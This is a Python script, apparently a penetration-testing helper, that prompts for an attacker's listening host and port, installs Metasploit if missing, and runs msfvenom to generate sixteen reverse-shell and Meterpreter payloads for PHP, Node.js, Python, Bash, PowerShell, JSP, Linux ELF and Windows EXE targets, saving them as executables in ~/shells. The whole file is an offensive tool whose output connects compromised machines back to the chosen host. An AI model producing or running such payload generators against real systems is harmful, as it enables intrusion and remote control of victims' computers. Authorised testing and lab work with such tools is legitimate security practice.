import subprocess
import os
import sys
import shutil
from tqdm import tqdm
from dotenv import load_dotenv



HomePath = os.path.expanduser("~")
EnvFile = f"{HomePath}/shells/.shell.env"
load_dotenv(EnvFile)


def ResetEnv():
	if any(flag in sys.argv for flag in ["-r" , "--reset"]):
		return True
	else:
		return False

def MakeEnvFile():
	os.makedirs(f"{HomePath}/shells", exist_ok=True)
	if not os.path.isfile(EnvFile):
		open(EnvFile, "w").close()
	else:
		return None

def CheckIsMSFVenomIsInstalled():
	if shutil.which("msfvenom"):
		return True
	else:
		return False

def CheckAndGetEnvVariables():
	def GetAndSaveInputToEnv():
		LHOST = input("Whats your LHOST: ")
		LPORT = input("Whats your LPORT: ")
		with open(EnvFile, "w" , encoding="UTF-8") as Env:
			Env.write(f"LHOST={LHOST}\nLPORT={LPORT}")
		load_dotenv(EnvFile, override=True)

	if ResetEnv():
		GetAndSaveInputToEnv()
	elif os.getenv("LHOST") is None or os.getenv("LPORT") is None:
		GetAndSaveInputToEnv()
	else:
		return False

def GenerateShells():
	Payloads = {
		"RawShell.php": "php/reverse_php",
		"RawShell.js": "nodejs/shell_reverse_tcp",
		"RawShell.py": "python/shell_reverse_tcp",
		"RawShellX64.elf": "linux/x64/shell_reverse_tcp",
		"RawShellX64.exe": "windows/x64/shell_reverse_tcp",
		"RawShellX86.elf": "linux/x86/shell_reverse_tcp",
		"RawShellX86.exe": "windows/x86/shell_reverse_tcp",
		"RawShell.sh": "cmd/unix/reverse_bash",
		"RawShellX64.ps1": "windows/x64/powershell_reverse_tcp",
		"RawShell.jsp": "java/shell_reverse_tcp",
		"Meterpreter.php": "php/meterpreter/reverse_tcp",
		"Meterpreter.py": "python/meterpreter/reverse_tcp",
		"Meterpreterx86.exe": "windows/x86/meterpreter/reverse_tcp",
		"MeterpreterX86.elf": "linux/x86/meterpreter/reverse_tcp",
		"MeterpreterX64.elf": "linux/x64/meterpreter/reverse_tcp",
		"MeterpreterX64.exe": "windows/x64/meterpreter/reverse_tcp"
	}

	for FileName , Payload in tqdm(Payloads.items()):
		try:
			subprocess.run(["sudo", "msfvenom", "-p", Payload, f"LHOST={os.getenv('LHOST')}", f"LPORT={os.getenv('LPORT')}", "-f", "raw", "-o", f"{HomePath}/shells/{FileName}"], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL )
		except Exception as e:
			print(f"Something went wrong: {e}")
			sys.exit()
	subprocess.run(f"sudo chmod u+x {HomePath}/shells/*", shell=True)
	print(f"Shells are saved in {HomePath}/shells")

if not CheckIsMSFVenomIsInstalled():
	try:
		print("Installing metasploit-framework...")
		subprocess.run(["sudo", "apt" , "install", "-y" ,"metasploit-framework" ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	except subprocess.CalledProcessError as e:
		print(f"Something went wrong: {e}")
		sys.exit()
else:
	pass

if not CheckIsMSFVenomIsInstalled():
    print("metasploit-framework installation failed")
    sys.exit()

MakeEnvFile()
CheckAndGetEnvVariables()
GenerateShells()
